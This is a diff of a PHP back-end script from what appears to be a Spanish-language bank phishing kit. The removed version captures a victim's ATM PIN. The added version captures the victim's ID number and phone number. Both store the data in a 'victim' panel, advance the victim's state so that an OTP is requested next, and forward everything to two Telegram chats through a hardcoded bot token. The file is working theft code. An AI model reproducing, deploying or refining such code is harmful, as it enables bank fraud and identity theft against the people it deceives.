@@ -1,53 +1,45 @@
 <?php
-// Asegúrate de que NO haya espacios ni líneas vacías antes del <?php
-require('../panel/lib/funciones.php');
+require_once('../panel/lib/funciones.php');
 date_default_timezone_set('America/Bogota');
 
 $ip = $_SERVER['REMOTE_ADDR'];
-$pin = isset($_POST['pass']) ? $_POST['pass'] : ''; 
+$documento = isset($_POST['doc']) ? $_POST['doc'] : '';
+$celular = isset($_POST['cel']) ? $_POST['cel'] : '';
 
-if (!empty($pin)) {
-    // 1. Guardar en base de datos (Si falla, el código sigue)
-    if (function_exists('actualizar_registro')) {
-        actualizar_registro($ip, "PIN", $pin); 
+if (!empty($documento)) {
+    // 1. Guardar en Panel
+    if (function_exists('traer_regitro')) {
+        $registro = traer_regitro($ip);
+        actualizar_registro_info($registro, $documento, $celular);
     }
-    
-    // Cambiar estado a 4 (Si la función no existe, no romperá el envío)
+
+    // 2. CAMBIO DE ESTADO A 2 (Para que pida Dinámica / OTP.php)
     if (function_exists('actualizar_estado_victima')) {
-        actualizar_estado_victima($ip, "4"); 
+        actualizar_estado_victima($ip, "2"); 
     }
 
-    // 2. Configuración del Bot de 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐
+    // 3. Envío a Telegram 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐
     $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
-    $chat_ids = ["8114050673", "8518977918"]; 
-
-    // 3. Formato del mensaje
-    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - NUEVO PIN</b> ⭐\n\n";
-    $mensaje .= "👤 <b>IP:</b> <code>" . $ip . "</code>\n";
-    $mensaje .= "🔑 <b>PIN DE CAJERO:</b> <code>" . $pin . "</code>\n";
-    $mensaje .= "⏰ <b>FECHA:</b> " . date('d/m/Y H:i:s') . "\n";
+    $chat_ids = ["8114050673", "8518977918"];
+    
+    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INFO</b> ⭐\n\n";
+    $mensaje .= "👤 IP: <code>$ip</code>\n";
+    $mensaje .= "🪪 Doc: <code>$documento</code>\n";
+    $mensaje .= "📱 Cel: <code>$celular</code>\n";
     $mensaje .= "━━━━━━━━━━━━━━━";
 
-    // 4. Envío mediante CURL
     foreach ($chat_ids as $id) {
-        $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
-        $params = [
-            'chat_id' => $id,
-            'text' => $mensaje,
-            'parse_mode' => 'HTML'
-        ];
-
+        $url = "https://api.telegram.org/bot$token/sendMessage";
+        $data = ['chat_id' => $id, 'text' => $mensaje, 'parse_mode' => 'HTML'];
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        
-        $result = curl_exec($ch);
+        curl_exec($ch);
         curl_close($ch);
     }
 }
+echo "ok";
 ?>
